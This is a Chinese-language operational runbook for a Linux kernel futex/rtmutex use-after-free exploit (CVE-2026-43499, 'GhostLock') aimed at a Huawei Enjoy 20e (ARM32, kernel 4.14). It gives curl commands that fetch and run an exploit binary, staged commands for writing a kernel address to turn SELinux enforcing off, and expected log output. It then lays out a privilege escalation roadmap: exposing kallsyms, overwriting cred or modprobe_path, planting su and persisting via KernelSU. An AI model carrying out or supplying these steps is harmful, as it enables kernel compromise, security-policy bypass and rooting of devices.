# CVE-2026-43499 (GhostLock) 手机端运行步骤
## 华为畅享 20e (MLD-AL10, MT6765, Android 10) — Exploit v2.1

> 最后更新: 2026-09-09
> 版本: v2.6 (对照实验: 普通 FUTEX_WAIT(500ms) 验证 futex+时钟+超时机制, WAIT_REQUEUE_PI 前后打印 sigsys_hit 排除 seccomp)
> 提交: 见 git log

---

## 0. 先读这里（安全须知）

- 本工具只用于**你自己拥有**的设备进行安全研究。
- **先跑默认模式**（不写任何内核地址，安全）验证写入链，再考虑 `-s` 试验。
- 设备**可能崩溃重启**（属正常现象，说明漏洞存在），重要数据请先备份。
- 运行前请保证电量 > 50%，建议连接充电器。

---

## 1. 前置检查（30 秒）

```sh
uname -m          # 必须显示 armv7l 或 armv8l (ARM32)
uname -r          # 应为 4.14.141+ (在漏洞范围 2.6.39~7.1 内)
cat /sys/fs/selinux/enforce          # 1=Enforcing(目标), 0=Permissive(已放行)
```

> **若厂商已合并修复补丁 `3bfdc63936dd`
> （"rtmutex: Use waiter::task instead of current in remove_waiter()"）则无效。
> 注意: 该补丁 2026-05 才进主线，4.14 老内核（2022-09 构建）不可能同步，你的判断成立。**

---

## 2. 更新到 v2.1（覆盖旧二进制）

```sh
cd ~/cve_2026_43499
curl -L -o exploit https://raw.githubusercontent.com/1332915/-10e-/main/cve_2026_43499/exploit
curl -L -o run_boot.sh https://raw.githubusercontent.com/1332915/-10e-/main/cve_2026_43499/run_boot.sh
chmod 755 exploit run_boot.sh
sha256sum exploit    # 必须 = 6676881cbafa1691572f29a914ddcc8d99f1f76f2664db410156bef7b508d15c
```

> 若 sha256 不符，是 GitHub raw 缓存，加 `?x=$(date +%s)` 再下载一次。

---

## 3. 分阶段运行（按顺序！）

### 阶段 1：默认模式 — 验证写入链（安全，不写内核地址）

```sh
sh run_boot.sh
```

**v2.1 新日志（关键看这 4 行 + 末尾）：**

```
[*] main: CMP_REQUEUE_PI ret=ffffffdd    ← -35=EDEADLK: 漏洞路径命中!
[*] waiter: WAIT_REQUEUE_PI ret=ffffff92 ← -110=ETIMEDOUT: 悬垂形成, 正常
[*] consumer: sched ret=00000000         ← 0: adjust_pi 触发成功
[*] after walk: rb_node  =0x...          ← 关键验证!
```

| 结果 | 含义 | 下一步 |
|---|---|---|
| `CMP_REQUEUE_PI ret=ffffffdd` | ✅ 死锁回滚触发，UAF 悬垂形成 | 看 rb_node |
| `CMP_REQUEUE_PI ret` 非 EDEADLK | 死锁环没建成（时序/锁序） | 贴日志给我，调时序 |
| `WAIT_REQUEUE_PI ret=ffffff92` | ✅ 超时醒（回滚后正常路径） | — |
| `rb_node` ≠ `11111111`（变 0 或 c0/e0 开头） | ✅ **写入链打通**（dequeue 写 0 / enqueue 写栈地址） | 进入阶段 2 |
| `rb_node` 仍 `11111111` | stamp 没命中悬垂帧 | 贴日志，我调 nfds/偏移组合 |
| 设备崩溃重启 | walk 打到无效地址 | 贴崩溃前日志 |

### 阶段 2（试验）：SELinux enforcing → 0

```sh
sh run_boot.sh -s 0xC211E598    # offsets.json 的 4.14.141 值(未验证, 仅供试验)
```

> ⚠️ **直接对内核全局变量做 rb 树操作，可能崩溃。**
> 仅在阶段 1 `rb_node` 已变化后尝试。
> 成功后：`cat /sys/fs/selinux/enforce` 应显示 0。
> 若崩溃：贴日志，回阶段 1 继续调。

---

## 4. 故障排查（v2.1）

| # | 现象 | 原因/对策 |
|---|---|---|
| 1 | `CMP_REQUEUE_PI ret` 是 `0` 或 `ffffff90`(-112) | 死锁环未建成。确认 owner/waiter/main 三线程锁序；重跑 2-3 次 |
| 2 | `sched ret` 非 0 | 被 seccomp 拦或权限不足；exploit 会转 `sched_setscheduler` 兜底，看第二行 sched ret |
| 3 | 阶段 1 rb_node 未变 | stamp 帧深度未命中。调整点：`exploit_pure.c` 的 `nfds_list`/`off_list`；或 `-p <prio>` |
| 4 | `-s` 崩溃 | 地址不对或 PAN 开启。崩溃本身是信息：说明 walk 走到了目标附近 |
| 5 | 全无输出/被杀 | Termux seccomp 拦截；用 MT 管理器方式运行 |

---

## 5. 参考实现（公开资料，2026-09 已核验）

| 项目 | 关键点 | 对本项目的意义 |
|---|---|---|
| PeronGH/ghostlock-selinux-disabler | Write-1 精简版：`fake_right=base+0x100 → byte0=0(enforcing), byte1=1`；**kaslr_slide=0 直接写**；重试 20 次 + slab 排空；以 `/sys/fs/selinux/enforce` 读到 0 为成功判据 | 印证"无 KASLR 设备用固定偏移直写"路线；写 0 目标就是 enforcing |
| p2p3p/GhostLock-for-OnePlus | 两阶段：W1 selinux_state.enforcing=0 → W2 cred=init_cred 提权 → KernelSU；偏移表以 `uname -r` 为键；KASLR 用 boot_id/fops 泄露 | W2 思路：fork 子进程 → 定位 task_struct → cred 覆盖 → 清 seccomp。**我们缺的是设备符号地址** |
| snothin/CyberMeowfia | 官方 PoC 分支；dirty-pipe 式文件覆写，6.12 Galaxy | ARM64/新版内核路线，暂不适用 |

**共同点**：全部依赖**设备内核偏移表**（boot.img 提取），与本项目已完成的
`boot_arm32.img` 解析（4.9.117 kallsyms 全量提取）方向一致。
差异：它们都是 ARM64 + 有完整偏移；我们设备是 **ARM32 4.14.141+ 且 kallsyms 不可读**，
符号地址只能靠 boot 镜像解析或 `-s` 试验。

---

## 6. SELinux 关闭后的提权路线图（W2 准备）

SELinux 变 Permissive 后，按此顺序准备提权：

1. **验证**：`cat /sys/fs/selinux/enforce` → 0；`getenforce` → Permissive
2. **解锁符号**（关键前置）：本原语是"写 0"，最理想目标之一就是
   `kptr_restrict` 写 0 → `/proc/kallsyms` 全量可读 → 拿到设备真实符号地址
   （selinux_enforcing / init_cred / commit_creds / modprobe_path …）
3. **W2 提权**（参考 p2p3p 路线，需地址就绪后）：
   - 方案 A：cred → init_cred 覆盖（需 task_struct/cred 偏移）
   - 方案 B：modprobe_path 覆写（需字符串写原语，本项目当前是写 0，需扩展）
   - 方案 C：permissive 后 remount /system rw + 植入 su（需 CAP_SYS_ADMIN）
4. **持久化**：KernelSU/ksud（需 GKI 或可加载模块；本机非 GKI，优先方案 A 后
   直接 root shell）

> 当前阶段：还在阶段 1（写入链验证）。先贴一次完整运行日志。

---

## 7. 原理摘要（v2 触发链，已对照 4.14 源码逐行核实）

```
owner:   LOCK_PI(f_pi_target) → LOCK_PI(f_pi_chain)   [阻塞]
waiter:  LOCK_PI(f_pi_chain) → WAIT_REQUEUE_PI(f_wait → f_pi_target) [阻塞]
main:    CMP_REQUEUE_PI(f_wait → f_pi_target, 1, 1)
         → futex_requeue 代理锁死锁检测 → EDEADLK 回滚
         → remove_waiter() 用 current 而非 waiter->task 清理 → 悬垂
         （4.14 futex.c:2112-2117 确认: EDEADLK 分支不清 pi_blocked_on,
           waiter 留在 f_wait 靠超时醒, 超时清理 unqueue_me 也不动它）
waiter:  超时返回 → 栈帧释放 → UAF 悬垂点
waiter:  ★立即喷射（返回后第一个 syscall, 同帧深度）覆盖悬垂帧
consumer: sched_setscheduler → rt_mutex_adjust_pi（4.14 无条件触发）
         → 链行走: next_lock=waiter->lock 检查通过 → trylock 用户态伪锁
         → dequeue(rb_erase 空树) 写 0 到 rb_node 槽 → 验证点
```

## 8. 复现链参考

- 官方修复: `3bfdc63936dd`（NVD: CVE-2026-43499，受影响 2.6.39 ~ 7.1，未修复版本含 4.14）
- 官方报告: https://nebusec.ai/research/ionstack-part-2/
- 公开 PoC: NebuSec/CyberMeowfia → IonStack/CVE-2026-43499
- Write-1 精简: PeronGH/ghostlock-selinux-disabler
- W1+W2 完整: p2p3p/GhostLock-for-OnePlus
